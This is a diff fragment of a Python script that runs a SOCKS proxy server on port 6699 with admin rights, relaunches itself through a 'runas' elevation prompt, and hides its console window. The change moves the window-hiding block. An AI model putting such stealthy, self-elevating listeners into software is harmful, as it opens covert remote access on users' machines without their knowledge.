@@ -230,13 +230,6 @@ if is_admin():
            if __name__ == '__main__':
                     with ThreadingTCPServer((ip, 6699), SocksProxy) as server:
                             server.serve_forever()
-    
-                    #hide console into background
-                    kernel32 = ctypes.WinDLL('kernel32')
-                    user32 = ctypes.WinDLL('user32')
-                    SW_HIDE = 0
-                    hWnd = kernel32.GetConsoleWindow()
-                    user32.ShowWindow(hWnd, SW_HIDE)
 
         if ipFlag == "PRIVATE":
 
@@ -248,3 +241,10 @@ if is_admin():
 else:
         #re-run the program and elevate permissions to admin
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+
+        #hide console into background
+        kernel32 = ctypes.WinDLL('kernel32')
+        user32 = ctypes.WinDLL('user32')
+        SW_HIDE = 0
+        hWnd = kernel32.GetConsoleWindow()
+        user32.ShowWindow(hWnd, SW_HIDE)
